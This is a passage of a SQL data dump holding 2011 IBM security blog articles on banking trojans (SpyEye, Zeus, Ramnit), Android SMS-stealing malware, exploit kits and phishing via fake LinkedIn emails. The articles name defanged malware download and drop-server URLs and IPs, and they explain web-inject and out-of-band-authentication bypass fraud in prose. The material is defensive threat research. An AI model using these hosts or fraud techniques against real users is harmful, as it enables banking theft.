transaction verification systems demonstrate that:', '\'Banking\', \'Endpoint\', \'Endpoint Protection\', \'Malware\', \'Online Banking\', \'SMS\', \'Transaction Verification Systems\', \'verification systems\'', 'https://securityintelligence.com/fictitious-transfers-latest-bank-heist/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (656, 'First SpyEye Attack on Android Mobile Platform Now in the Wild', 'Amit Klein', '2011-9-13', 'It seems that SpyEye distributors are catching up with the   as they (finally) target the Android mobile platform. Ever since Man in the Mobile attacks (MitMo/ZitMo) first emerged in late 2010, SpyEye followed Zeus’ tracks by introducing its own hybrid desktop-mobile attacks (dubbed SPITMO). The most recent achievement (that is, until our discovery at the end of July) of SpyEye in the mobile arena was reported in April on F-Secure’s blog. The Trojan injects fields into a bank’s Web page and asks customers to input their mobile phone number and the IMEI of the phone. The bank customers are then told the information is needed so a “certificate” can be sent to the phone and are informed that it can take up to three days before the certificate is ready. “The Trojan is signed with a developer certificate. Developer certificates are tied to certain IMEIs and can only be installed to phones that have an IMEI that is listed in the certificate. This is why the   author(s) request the IMEI in addition to the phone number on the bank’s website. Once they receive new IMEIs, they request an updated certificate with IMEIs for all victims and create a new installer signed with the updated certificate.” “The delay in getting the new certificate explains why the SpyEye-injected message states it can take up to three days for the certificate to be delivered.” Up to three days to accomplish an attack in 2011? This is due to the following cumbersome cycle used to circumvent Symbian’s signing requirement: Waiting three days just to steal a couple of SMSs is not a reasonable overhead now that we have Android OS, which provides a much more intuitive and modern approach to loot the desired treasure. Before we dive into the analysis, here’s a pictorial overview of MitMo evolution. The following analysis is based on a compromised machine with SpyEye as found by Trusteer, an IBM company, in the wild on July 24th: When a compromised user browses to the targeted bank, a message is injected presenting a “new” security measure, supposedly enforced by the bank, which is now mandatory in order to use its online banking service. The new measure pretends to be an Android application that protects the phone’s SMS messages from being intercepted (there’s irony for you) and will protect the user against fraud. Clicking on “set the application” displays an additional injected message, providing further instructions for installing the application: The user is directed to the download URL “hxxp://www.androidseguridad.com/simseg.apk.” After the compromised user installs the Android application on his or her device, the application named “System” is not visible on the device dashboard. It’s not a service, and it’s not listed in any current running applications. In order for a user to determine the existence of this app, a bit of searching is required: To complete the installation, the user is instructed to dial the number “325000”; the call is intercepted by the Android malware and the “alleged” activation code is presented, to be submitted later into the “bank’s site”: The following is a de-compiled code snippet that is responsible for the “activation code” operation. There is no other reference to it in the application package (as of July 24): Now that the Trojan has installed successfully, all incoming SMSs will be intercepted and transferred to the attacker C&C; the de-compiled code snippet below is run when an SMS is received, creating a string for later use: As implied from the string structure, it will later be appended as a query string to a GET HTTP request to be sent to the attacker’s drop zone. The application package consists of a “Settings.xml” file (asset directory), which contains a configuration for the Trojan; “Settings.xml” defines: Here’s a snippet of the extracted “Settings.xml”: When examining the drop URLs, four of the domain names in use are not registered (yet!): 124ff42.com; 124ffdfsaf.com; and 124sfafsaffa.com. However, one of them is not new in relation to SpyEye: The domain “124ffsaf.com” has been “hopping” around different IPs, in several locations, around the world. Here’s a snippet from SpyEye’s tracker history record for domain 124ffsaf.com over a three-day period: Peeking around the attacker C&C reveals an unprotected (at the moment!) statistics page: It’s worth pointing out that the information presented in the Attacker C&C above was produced when we tested the Trojan in action in our lab. Sender 15555215556 and Recipient 15555215554 refers to two Android emulators we used to simulate the attack (the corresponding HTTP traffic is presented above). As indicated by the statistics page above, the attack has yet to gain momentum, so consider this a warning. I’m pretty sure this is just the beginning, so I’m tempted to say, “To be continued…” Organizations must act now and install a desktop browser security solution as part of a multilayered security profile. For banks that already offer Trusteer Rapport to their customers, the good news is they’re automatically protected and are not vulnerable to this attack — even if the   is downloaded. This is because Rapport prevents SpyEye from installing on the customer’s PC; therefore, the entire chain of attack is terminated before it has a chance to take hold. For those that haven’t downloaded Rapport, Trusteer Pinpoint will detect and report in real time victims who are infected with this variant of SpyEye as they attempt to connect to the bank’s website. By restricting the services available to these machines, such as the ability to complete transactions, the attack is defeated. Finally, Trusteer Mobile for Android (either Secure Library or Secure Browser) will detect and block this attack on the Android mobile platform, preventing any malicious activity.', '\'Android\', \'HTTP\', \'Malware\', \'Man-in-the-Browser (MitB) Malware\', \'Mobile\', \'Mobile Apps\', \'Mobile Security\', \'SMS\', \'SpyEye\', \'Trojan\', \'Trusteer\', \'Web injects\', \'Zeus Malware\'', 'https://securityintelligence.com/first-spyeye-attack-android-mobile-platform-now-wild/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (657, 'Ramnit Evolution: From Worm to Financial Malware', 'George Tubin', '2011-8-22', 'In January 2010, a new worm named Ramnit was spotted in the wild. A worm is a type of malware that secretly and maliciously integrates itself into a   and infects more files each time the host program is run. This worm can infect Windows executable files, HTML files, office files and possibly other file types as well. This blog examines this type of worm from a financial point of view; for in-depth analysis of Ramnit’s parasitic behavior, see this   blog post. Although this type of worm employs old-generation malicious techniques, we kept it on our malware radar. A few weeks ago, we started seeing something interesting. Apparently, Ramnit morphed into a financial malware — or at least was used as a platform to commit financial fraud; we’re still investigating its modular architecture. Once installed, this malware will continuously communicate with the command-and-control (C&C) server, reporting on its status and receiving configuration updates; inbound and outbound communication is over SSL (HTTPS). Ramnit’s authors followed the standard approach of malicious financial activities, supporting all basic features required for well-bred financial malware. The   includes a Man-in-the-Browser (MitB) Web injection module, which enables the malware to modify Web pages on the client side, modify transaction content, insert additional transactions, etc., all in a completely covert fashion invisible to both the user and host application. Here is a sample Ramnit injection. Note the “security tip” created by the fraudsters in the injected message: While analyzing Ramnit’s malicious activities, we noticed its configuration format is similar to the notorious Zeus and SpyEye financial malware platforms: [set_url] [data_before][data_end] [data_inject] [data_end] [data_after] [data_end] Ramnit consists of several independent components (see partial list below). One particular component, Zeus, caught our attention because it’s the HTMP injection engine used by Ramnit. Since the Zeus source code is available for free, and given the similarities between Zeus’ and Ramnit’s “standard financial approach” and configuration format, we suspect the   incorporated parts of Zeus into Ramnit. We are still investigating Ramnit’s Zeus component. The latest version of Ramnit consists of stand-alone modules; some are bundled with the dropper binary and some are fetched from its C&C. The following is a partial list of Ramnit components: Ramnit’s different components are still under investigation, as well as the malware itself. We will update this blog shortly with more findings, so stay tuned.', '\'Command-and-Control (C&C)\', \'Financial Malware\', \'HTML Injection\', \'HTTPS\', \'Malware\', \'Man-in-the-Browser (MitB) Malware\', \'Ramnit\', \'Secure Sockets Layer (SSL)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/ramnit-evolution-from-worm-to-financial-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (658, 'US, UK, Canada Top SpyEye Target List', 'Mickey Boodaei', '2011-7-26', 'Research findings from IBM indicate that the number of financial institutions targeted by the SpyEye Trojan is growing. In parallel with this, our risk analysis teams have also observed an increase in the number of countries where financial institutions are being targeted by fraudsters using this Trojan. Analyzing this malware’s command-and-control (C&C) centers, which the risk analysis team at IBM reviews every month, revealed that 60 percent of the SpyEye bots target financial institutions in the U.S. This is followed by the U.K. (53 percent), Canada (31 percent), Germany (29 percent) and Australia (20 percent). Interestingly enough, the percentage of bots targeting Canadian banks more than doubled from 14 percent in May 2011 to 31 percent the following month. Other destinations targeted by more than 10 percent of these bots include Italy, Ireland, UAE, Spain, Costa Rica, France, Turkey, India, Jordan, Russia and Portugal. Meanwhile, SpyEye continues to expand its hit list. In May, it added targets in the Middle East to include Saudi Arabia, Bahrain and Oman. In June, financial institutions in Venezuela, Belarus, Ukraine, Moldova, Estonia, Latvia, Finland, Japan, Hong Kong and Peru faced attacks. Russia is also a relatively new addition to the target list. It is worth noting that the fraud patterns used here are somewhat different than those used by   and other financial malware. Specifically, our risk analysis teams have observed new code being incorporated into the Trojan that is designed to evade transaction-monitoring systems. Transaction-monitoring systems analyze various aspects of the customer’s session with the bank in order to detect abnormal behavior that may be attributed to malware activity. These fraud developers appear to have figured out how these defenses operate and are now constantly trying to ensure their code activity flies under the radar of these   and   systems. The code seems to follow Agile software development practices: It is flexibly and simply coded, and new configurations are being rolled out as quickly as possible by its developers. At certain times, we have even seen two new versions of the malware released every week. There is a large difference between a new version and a simple variant of financial malware. A new version means that the program code itself has been modified, whereas a new variant is just new packing around the same code. Some of the changes that our risk analysis teams are seeing include very significant improvements to the malware’s core technology. The author’s ability to rapidly react and improve the software should be a major concern to anyone who already is — or who may be — on SpyEye’s target list. Although it seems much older, this malware toolkit surfaced less than two years ago in December 2009. Over the last 18 months, it has made several headlines, especially when it was revealed that the development team behind the malware was effectively merging it with that of the older Zeus code. From the very beginning, SpyEye has been a highly aggressive Trojan. Interestingly, early versions of the malware included a feature to remove Zeus from an infected host machine. This feature was, of course, in place to ensure that this is the only financial malware on the infected computer. We have covered SpyEye a few times before in our  . Therefore, the evolution of the malware toolkit is not surprising. Overall, financial institutions should monitor development in the SpyEye toolkit, paying close attention to its attack vectors that target their brand as well as new attacks that target other financial institutions. The intelligence from this process should be included in the financial institution’s security controls, such as anomaly detection and endpoint protection. The ability to react quickly to SpyEye’s changes in pattern is key to an effective  .', '\'Agile\', \'Australia\', \'Command-and-Control (C&C)\', \'Germany\', \'Malware\', \'Risk Assessment\', \'SpyEye\', \'SpyEye Trojan\', \'Trojan\', \'United Kingdom\', \'Zeus\'', 'https://securityintelligence.com/us-uk-canada-top-spyeye-target-list/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (659, 'Mobile Malware: Why Fraudsters Are Two Steps Ahead', 'Mickey Boodaei', '2011-7-11', 'The bad news: Fraudsters have all the tools they need to effectively turn   into the biggest customer security problem we’ve ever seen. They are lacking just one thing: customer adoption. The number of users who bank online from their mobile devices is still relatively low. Additionally, transactions are not yet enabled for mobile devices on many banks’ websites. Since online fraud is mostly a big numbers game, attacking mobile bankers is not yet an effective fraud operation, but expect that to change. A year from now, this is all going to look completely different as more users start banking from their mobile devices and fraudsters bring out the big guns. IBM has just released figures predicting that within 12 to 24 months, more than one in 20 (5.6 percent) Android phones and iPads/iPhones could become infected by mobile malware if fraudsters start integrating zero-day mobile vulnerabilities into leading exploit kits. Android’s security architecture is not currently up to the challenge. This is reflected mainly in the ease of generating powerful fraudulent applications and the ease with which they can be distributed. Fraudsters can easily build applications that have access to sensitive operating system resources such as text messages, voice, location and more. Users installing these applications do receive a message with a list of resources to which the app requests access, but will usually ignore it, since many applications request access to an extensive list of resources. Building a powerful fraudulent Android application that steals and abuses your identity and bank account is almost trivial; distributing these applications on the Android Market is even more trivial. There are no real controls built into the submission process that could identify and prevent the publishing of malicious applications. Compared to Apple’s App Store,  : You can’t always trust applications you download from it. Fraudsters have already started to abuse this big security hole. Dozens of   have already been identified on Google Play; Google has removed most of them, but more keep coming. IBM has identified malicious applications on Google Play that have remained available for weeks before being taken down by Google. The average user will find it hard to locate the page that allows you to request Google to review and remove inappropriate applications from the Play store. And don’t expect Google to react quickly to anything you submit through this form — we have used it a few times ourselves with no results. In order to take down an application from Google Play, we actually had to use contacts within Google that aren’t available to the average user. The process of identifying and removing malicious applications from Google Play requires major improvements. Most of the malicious applications that hit Android are not financial. However, in May of this year, we saw the previously discovered Man-in-the-Mobile (MitMo) malware — which has attacked Symbian, BlackBerry and Windows phones — ported to Android. This attack is designed to bypass banks’ SMS Out-of-Band (OOB) Authentication and transaction verification processes. The proximity of this attack to the recent FFIEC guidance that advises banks to consider, among other options, OOB to fight malware attacks is ironic; it demonstrates exactly why the fraudsters are two steps ahead. For those of you who don’t know how OOB works, here is a short description: The general idea is to fight malware that infects the user’s machine. Once the user browses to a bank’s website from a PC infected with financial malware such as   or SpyEye, the malware takes over the Web session and injects fraudulent transactions on behalf of the user. With OOB in place, the bank sends a text message to the user’s preregistered phone number. The message includes the transaction details and a verification code. The user must copy the verification code from the mobile device back to the browser on the PC. The assumption is that if the transaction was generated by malware, the user will not complete the process and will not copy the confirmation code back to the browser, and as a result, the bank will not approve the transaction. \n The MitMo attack breaks this assumption by doing the following: Once the user is infected and tries to access the bank’s website, the malware kicks in and asks the user to download an authentication or security component onto their mobile device to complete the login process. The user wrongly assumes this message comes from the bank, when in reality, it comes from the malware. Once the user installs the malware on the  , the fraudsters control both the user’s PC and the user’s phone. Next, the malware generates a fraudulent transaction on behalf of the user. The bank then sends a confirmation message to the user’s mobile device. The malware on the user’s device reads the confirmation message and sends it to the malware on the PC. It then deletes the confirmation message from the user’s mobile device so the user will not see it. The malware on the user’s PC enters the confirmation code and approves the transaction. The Android malware that spread in May of this year came in different flavors. One such flavor even used the IBM Security Trusteer brand to gain users’ trust and convince them to download the application. The malware itself was used in conjunction with Zeus 2.1.0.10. Users were first infected with   on their PC, and then Zeus showed the message requesting that users download the Android malware component. Those who have already downloaded IBM Security Trusteer Rapport are protected from this type of attack. iOS is the operating system of the iPhone, iPad and iPod. It’s a slightly different story with iOS malware. It’s not easy to create malicious applications that have access to device resources because iOS applies strict access control on applications. It’s also not easy to introduce malicious applications on the App Store since Apple conducts a manual review of each submitted application, which allows them to detect fraudulent apps. However, there is a hole in this security architecture, and it’s called jailbreaking. A jailbroken iOS device doesn’t enforce access control and basically allows any app to do whatever it wants on the device. Unfortunately, many users jailbreak their devices because they want to run applications that are not available on the App Store. But what’s more unfortunate is that vulnerabilities in iOS could allow malicious websites to jailbreak a device and infect it with malware without a user’s consent or knowledge. Last week we saw a good example of that. JailbreakMe published an exploit that allows the automated jailbreaking of iOS devices from a special website. PDF files that exploit this vulnerability are reportedly publicly available. Even clicking a crafted PDF document or surfing to a website hosting the PDF documents is sufficient to infect the mobile device with malware. The concept of malicious websites serving exploits to infect endpoint devices has been mastered by fraudsters; the notorious BlackHole exploit kit and other kits such as Fragus and Neosploit provide automation of these processes. BlackHole is extremely dangerous and widely used since it is distributed for free. Millions of websites are being compromised to run these exploit kits. When users browse to one of these compromised websites, they get infected with malware. Note that fraudsters can use the same exploit kit to serve any piece of malware they choose. Once the authors of BlackHole add iOS vulnerabilities to their kit, we’ll start seeing a quick increase in malware distribution on iOS devices. This recent vulnerability is not the first to allow fraudsters to compromise iOS devices, and it won’t be the last. This is just the beginning of the issue. Fraudsters will continue to research iOS and discover more vulnerabilities, which will allow them to compromise devices and commit fraud. I hope I’m wrong, but a year from now this may be so common that it will not even hit the news. In the U.S. alone, 50 percent of all mobile phones are smartphones, with   and iPhone being the clear market leaders; a survey of smartphone users from Toronto-based Solutions Research Group showed that 38 percent of these smartphone owners use a banking application. These two numbers are increasing constantly and are just big enough for fraudsters to start using their heavy guns. All the building blocks are in place: Fraudsters are researching iOS and Android for vulnerabilities; they have effective exploit kits that can automate this process; they have large-scale operations that compromise websites and force them to distribute malware; and they have effective malware for mobile that can commit fraud. In my opinion, this all leads to one conclusion: We are about to face one of the worst security problems of our time, and it won’t be long before we do. Anti-malware solutions for mobile phones are hardly the answer to this problem. These solutions are no different than their PC counterparts: They’re based on scanning applications installed on the device against a list of known malicious applications. This type of solution cannot scale when the number of malicious applications explodes. As   numbers increase, we’re about to see the very same problem we currently face with desktop antivirus solutions: low effectiveness. A new solution that takes a different approach for mobile security is required — one that can prevent these devices from getting infected to begin with and protect mobile communication with banks from malware that may end up on the device. Recommendations to secure mobile banking: IBM statistics for June 2011 show that each day, one out of 1,500 users accesses a website infected with the BlackHole exploit kit. Out of one million users, 667 will access the BlackHole exploit kit every day; assuming the BlackHole kit incorporates a zero-day exploit, this indicates 667 infected users per 1 million per day. Assuming it takes Apple or Google one week to fix the vulnerability and that it takes an average of two weeks for users to update their mobile phones with a new release, this translates to an average of 21 days of exposure. In this time, 14,000 users per million will get infected with the zero-day attack. Assuming four of these zero-day exploits per year, we’re looking at 56,000 infections per year per million users, which is a total of 5.6 percent of all users — an extremely high number.', '\'Android\', \'Blackhole\', \'Blackhole Exploit Kit (BHEK)\', \'Google\', \'Google Play\', \'iPhone\', \'Mobile Malware\', \'Mobile Security\', \'Out-of-Band (OOB) Authentication\', \'Zero-Day Exploit\'', 'https://securityintelligence.com/mobile-malware-why-fraudsters-are-two-steps-ahead/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (660, 'Hiloti Trojan Downloader Infection Rates Triple in UK', 'Amit Klein', '2011-6-30', 'generic downloader is a Trojan that was first seen in December 2008 and has shown a dramatic increase in infection rates of PCs during June 2011. The malware is a generic malware downloader, meaning it typically downloads other malware such as   and  . Hiloti creates a malicious DLL in the Windows directory and hacks the Windows registry to maintain its presence on an infected machine across a normal boot cycle. IBM analysts suspect that a Hiloti-infecting campaign — quite likely a drive-by download infection — is now taking place, having started on June 20. Here is a typical infection graph from the U.K., which shows that Hiloti   are surging to two to three times previous levels of infection: What’s interesting is that the infection does not appear to be affecting the U.S. and other international territories, suggesting that it is a carefully   on one or more U.K. banking portals. IBM Security’s research teams will continue to monitor the levels of infection of Hiloti. Users of the IBM Security Trusteer Rapport   are reportedly protected from the Hiloti downloader and its financial payload — even if other security defenses have not detected it.', '\'Malware\', \'United Kingdom\'', 'https://securityintelligence.com/hiloti-trojan-downloader-infection-rates-triple-uk/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (661, 'SpyEye Trojan Targets Airline Travel Websites', 'Amit Klein', '2011-6-16', 'IBM has uncovered a SpyEye configuration that targets users of two leading European airline travel websites: Air Berlin, the second-largest airline in Germany after Lufthansa, and AirPlus, the global provider of business travel services for companies. SpyEye exploits the user’s machine, not the websites, to carry out this fraud. The two companies are far from randomly selected, but are, we believe, carefully chosen for their criminal revenue potential. One site accepts debit card payments, while the other caters to business users. Air Berlin, now Europe’s sixth-largest airline, not only accepts debit and credit cards, but allows Austrian, Dutch and German citizens to pay by bank direct debit seven days before traveling. That means that criminals targeting an Air Berlin traveler from those countries stand a good chance of obtaining users’ personal details, including date of birth, which users must provide on the airline’s site, as well as their bank account details. AirPlus, meanwhile, offers a variety of travel services for companies of all sizes on their website, all paid for by business payment cards, which are invariably linked to business bank accounts. Since corporate accounts tend to carry much higher balances or credit limits than consumer accounts, they have much greater  , and therefore revenue, potential for cybercriminals. In the case of the Air Berlin attack, SpyEye attempts to harvest confidential user information, including username and password and other data that is entered on the targeted Web page. Since Air Berlin accepts bank debit card payments, the fraud potential is even more elevated. SpyEye’s injection code captures the information on username and password details: The AirPlus attack methodology, meanwhile, targets users of the Lufthansa Miles & More Visa credit card which offers bonus travel for purchases made using the card. Similar to the Air Berlin attack, the SpyEye code targets the main login URL of the AirPlus portal: In this instance, SpyEye injects code that claims to be an anti-fraud enhancement into the user’s Web browser. In reality, of course, this is a cleverly disguised attempt to phish user credentials from the unsuspecting customer of the AirPlus Web portal. Those credentials are quite comprehensive and include the card name and number, expiration date, CVV (signature strip) number and, as with the Air Berlin attack, the user’s date of birth. The harvesting of the user’s date of birth opens up the possibility of   and, we have observed, committing fraud by impersonating the user or using social engineering attack methods. It is important to understand that   is now highly organized, with specialization of duties assigned to different members of the criminal hierarchy. That means that the darkware coding gangs behind the variants of SpyEye are now choosing their targets carefully for maximum revenue yield with minimal effort. In addition, by enhancing the fraudulent data yield from each victim, the possibilities for   go way beyond that of the carder forums seen in the last few years. We believe that the cybercriminal gang(s) behind the attacks are almost certainly using a semi-automated methodology of code development, allowing them to develop customized versions of the malware for specific purposes. Clearly, the travel trade offers cybercriminals access to user and company account credentials with larger-than-normal account balances and credit card limits. Gaining access to Air Berlin bank account details in Austria, Germany and the Netherlands is an indication of targeting ingenuity. Unfortunately, traditional antivirus security mechanisms are largely unable to protect corporate users from SpyEye infections because the malware uses targeted reconnaissance combined with signature-detection evasion techniques to get a foothold inside computers. A better alternative for protecting Web-based services from becoming Trojan targets is to implement secure Web access. For example, browser-based tools that secure communication between the computer and cloud service provider website can prevent common attack methods like HTML injection and keylogging from grabbing data. Those same technologies can protect other browser-based applications, such as VPNs, CRM, retail, financial and collaboration systems that malware can exploit to steal user credentials and breach an enterprise’s security perimeter completely undetected. We expect to see more specialized versions of SpyEye shortly.', '\'Data Theft\', \'HTML Injection\', \'Identity Theft\', \'Malware\', \'SpyEye\', \'SpyEye Trojan\', \'Trojan\'', 'https://securityintelligence.com/spyeye-trojan-targets-airline-travel-websites/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (662, 'LinkedIn Spam Emails Download Malware', 'Mickey Boodaei', '2011-6-2', 'LinkedIn has more than 90 million members, half of whom are located in the United States. The social network’s membership includes executives from every company listed on the 2010 Fortune 500, which makes it an ideal platform for cyber attacks. Through LinkedIn, cyber criminals can locate key people within an enterprise and target them with spam emails that place malware on their computer or steal their   for email and other sensitive systems. Sound unlikely? Well, think again. The security team at IBM recently witnessed a malware campaign that targets LinkedIn users. It starts with a simple connect request sent to the victim’s inbox. Here is a screen capture of the email: For comparison, this is what a real LinkedIn invitation looks like: As you can see, they are pretty much identical. If you click the “Confirm that you know…” link on the genuine email, it takes you to LinkedIn’s website. If the same button is clicked on the  , it takes you to a malicious website that downloads malware onto your computer. The fraudulent website is hxxp://salesforceappi.com/loginapi.php?tp=1da14085e243eaf9 (“http” was replaced with “hxxp” to avoid confusion). To avoid getting infected, don’t try to follow this link or copy it into your browser. The domain salesforceappi.com was registered two days ago, and the IP address of the server is in Russia. The domain was designed to look like it’s associated with Salesforce.com, but in fact it has nothing to do with Salesforce.com. The malicious server uses the BlackHole exploit kit to download malware to the victim’s computer. This exploit kit used to sell for $1,500 but was recently made available for free. Its first version appeared on the black market in August 2010. It is based on PHP and has a MySQL database. BlackHole has infected thousands of websites, exploiting vulnerabilities on visitors’ computers in order to place malware on them. This attack is also known as a drive-by download. This specific malicious website uses BlackHole to download the notorious Zeus 2 malware to the victim’s computer. Zeus is a well-known and highly sophisticated piece of malware. Many mistakenly think that   is only associated with financial fraud; however, we’ve recently seen evidence of   in order to steal proprietary information and gain unauthorized access to sensitive systems. Enterprise users who click this link risk infecting their computers with Zeus, allowing cyber criminals to access their workstation and, from there, access sensitive corporate information and data. The attack becomes even more dangerous when Zeus infects workstations and laptops that are   but are used to access the enterprise through VPNs. Once installed, this variant of Zeus sends the information it steals to the following server in China: hxxp://xwhoisdns.com/msofficepsdx.php (IP address: 122.224.18.36). \n How likely are users to click this link and access this malicious server? A survey we conducted several months ago shows that 68 percent of enterprise users who receive a LinkedIn spam message are likely to click on it and inadvertently download malware. We are in the habit of clicking on links from social networks. They send us updates with calls to action on a daily basis and encourage us to follow links that increase the usage of their websites. Many users automatically click on such links without verifying their authenticity, an extremely dangerous practice. The LinkedIn spam is even more dangerous; LinkedIn integrates the action link into a button, which makes it even harder to retrieve and verify. Recent attacks against RSA, Epsilon, Sony, Google, Oak Ridge National Laboratory and many other enterprises demonstrate the vulnerability of endpoints against targeted malware attacks. Cyber criminals are putting a great deal of effort into these attacks and are unfortunately finding success. Only two out of 42 anti-malware solutions   this variant at the moment; most of the leading anti-malware solutions  . This demonstrates how easy it is for malware authors to create variants that completely fly under the radar of anti-malware solutions. The critical time for this attack was the last couple of days, when there was close to zero protection from anti-malware solutions. Tomorrow’s detection rates are irrelevant; by then, there will be some other variant attacking enterprises.  I  Never click on email links from social networking websites. We even recommend leaving the emails unopened. Access your social networks by typing their addresses into your browser. Log in to your account and read your messages directly from your profile’s inbox.  Your employees’ endpoints are highly targeted by cyber criminals. Unmanaged employee devices are the biggest security threat, but endpoint devices within the network are also a concern. The fact that you have a leading anti-malware solution installed on your endpoints doesn’t mean you’re immune to these attacks, which often use zero-day vulnerabilities and zero-day malware variants to bypass anti-malware solutions. Enterprises should complement their endpoint security with a zero-day data-protection solution.', '\'Blackhole\', \'Blackhole Exploit Kit (BHEK)\', \'Drive-by Download\', \'Endpoint\', \'Exploit Kit (EK)\', \'LinkedIn\', \'Malware\', \'MySQL\', \'PHP\', \'Zeus\'', 'https://securityintelligence.com/linkedin-spam-emails-download-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (663, 'Zeus Adds Investment Fraud to Its Bag of Tricks', 'Amit Klein', '2011-4-27', 'IBM recently discovered and investigated a very interesting new   configuration sample that uses credible-looking banner advertisements on major websites to offer high-return investment opportunities. This attack is targeting some of the world’s leading and most-trusted websites, including AOL, Amazon, Apple, CNN, Citibank, Forbes, ESPN and many more. Investment fraud is a new twist in the  These   have only one purpose: to lure users into investing their money through a fraudulent, yet legitimate-looking website. IBM traced several examples of this configuration file to attacks on leading websites. In one case, the Zeus mechanism embeds banners on the targeted websites, which redirect to the fraud site. We were surprised to see how well-integrated the banner designs were with the attacked websites. Here are some examples of banners that appeared on Google and Bing pages: In a very sophisticated attack against Forbes.com, the cyber criminals inject a compelling overview of the fictitious URS Investment Fund. They offer wealthy individuals the opportunity to achieve extremely high rates of return through a “prestigious” investment program. The content developed for this   establishes a new standard of credibility for the fraudsters. Here is the text embedded by the Zeus injection code on the attacked pages at Forbes.com: In a similar attack against the Yahoo Finance pages, fraudsters actually claim that URS has established a partnership with Yahoo. In this investment fraud campaign, criminals lowered the investment minimum to $1,000. Here is the text added by the Zeus injection mechanism on the site’s “Banking & Budgeting” page. Like the injected code, the website is professionally designed, user-friendly and has a simple registration process. It asks users to enter login and password details; however, it does not allow them to recover their account credentials. Upon registration, users are prompted to upload funds though a bank wire transfer or using Western Union. Next, they are asked to choose an investment program. Three options are presented in significant detail for minimum investments of $1,000, $5,000 and $10,000. These include investment schedules, interest rates and lump-sum profits. Below is a screen capture of a page that promises 7 percent, 11.3 percent, 16 percent and even 32 percent rates of return. Meanwhile, the “Our Partners” tab on the site lists companies that have been found in the Zeus configuration file, including AOL, Amazon, Apple, CNN, Citibank, Forbes, ESPN and others. We also found a Forbes logo on the home page of the site. The links leading to the websites of the listed companies (“You can read more details on their websites”) lead back to pages attacked by this configuration of Zeus. Users who are infected by Zeus and follow these links are presented with the same false information about their partnership with URS. We also checked WHOIS for information on the fraudulent site’s domain name, and found that records only start on March 11, 2011. However, according to the website, the URS company has existed since 1995 and is based in the U.S. We did not find any specific companies behind this website. Https://ursinvestment.com has a valid SSL certificate, which was issued on March 20, 2011. A Google cache of the website from March 26, 2010 points to the default Apache website, which is empty. The website is hosted on an IP address (178.18.243.227) that originates from Germany. Huan-jun-net, an unknown network, is responsible for hosting the website. This new targeted attack is noteworthy for the depth, breadth and level of sophistication of the content that the criminals have developed to make the scam appear legitimate and believable. Unlike many Zeus attacks, investment fraud is less about the attack code and more about  . With attack code already developed to the point where it can convincingly mimic real websites and trusted brands, it seems that criminal groups are bulking up investments in marketing communications to make their scams harder to differentiate from legitimate business offers presented to Web users. Without the ability for average Web users to “spot” fraudulent offers, e-commerce may be threatened. As a result, technology that secures Web sessions and transactions must fill the void.', '\'Amazon\', \'Apple\', \'Trojan\', \'Webinjection\', \'Western Union\', \'Yahoo\', \'Zeus\'', 'https://securityintelligence.com/zeus-adds-investment-fraud-bag-tricks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (664, 'RSA and Epsilon: Research Shows Education Can’t Protect Against New Social Engineering Attacks', 'Mickey Boodaei', '2011-4-13', 'The recent security events at RSA and Epsilon have once again raised the issue of social media engineering attacks against enterprises. RSA employees were targeted by an email titled “2011 Recruitment Plan.” Its subject seemed relevant and interesting enough for the targeted employees to open it. The email included an attachment that exploited a Flash   in order to install malware on the employees’ computers. This is the entire essence of social engineering; so how do cyber criminals trick users into voluntarily doing something they shouldn’t? The recent massive data leak from email service provider Epsilon will result in more employees being exposed to such attacks. At IBM, we have been monitoring social engineering attacks for some time and consider this method to be one of the most effective tools available to cyber criminals. Today, we’d like to share with you the results of a new research project we conducted on social engineering attacks and whether user education would defend against them. While many experts believe that social engineering attacks can be defeated with proper user education, our research has shown otherwise. We have found that a carefully crafted attack will fool even the most educated users. As a   best practice, users are told that if something calls for immediate action or looks uncommon, too good to be true or unlikely, it is most likely an attack. For example,   that encourage users to click on a link in order to unlock their bank account meet most of these criteria. It is unlikely for a bank to contact customers this way, and it calls for immediate action. Similarly, an email from tax authorities about a pending refund is probably too good to be true and such information would likely not be conveyed via email. These types of attacks can be explained to users and most likely avoided. Of course, in large populations,   regardless of how much effort is put into education. The tools that organizations have to train their customers are often not effective enough to reach all customers and simply convey the message. But what if the attack email is commonplace, doesn’t call for immediate action and isn’t too good to be true? Most users today get updates from social networking websites such as Facebook, Twitter and LinkedIn. These updates arrive on an almost daily basis and are reviewed by many users. All these social networking sites include multiple links in their emails, and it’s very common for users to click on these links. We all know that fraudsters actively use fake messages from social networking websites in order to install malware on victims’ computers. But how easy is it to create an effective attack? How likely is it that educated users will actually fall for this attack? These are the questions our research was designed to answer. We decided to focus on LinkedIn, even though we could have chosen Facebook or any other social networking website. We picked a population of 100 users comprising friends, family and other people we knew who seemed to be fairly educated about security. We asked their permission to take part in a security experiment that would not in any way put them at risk. However, we did not tell them what we were testing and how. First, we created a new identity on LinkedIn for the purposes of the study. Next, through very simple data-mining techniques, we were able to gather information about our targets — specifically their list of connections and their connections’ LinkedIn profiles. Since LinkedIn sends an alert when one of your connections has a new job, we decided to use this update method to create a fraudulent email. For each one of our targets, we crafted a fictitious new job alert. We chose one of their LinkedIn connections and announced that this person was now working for a company that directly competes with the victim’s company. We included a big button that said, “View [friend’s name] new Title,” just like LinkedIn does in its alerts; we also included the friend’s photo, just like LinkedIn does. Clicking on the button redirects the victim to a different website, not LinkedIn. The website we used was innocuous, but it was a placeholder for a potentially malicious website that places malware on the victim’s computer. We released this email to all 100 subjects on the same day and monitored who clicked the link and reached our landing page. Forty-one subjects reached our landing page within 24 hours, 52 subjects reached our landing page within 48 hours and 68 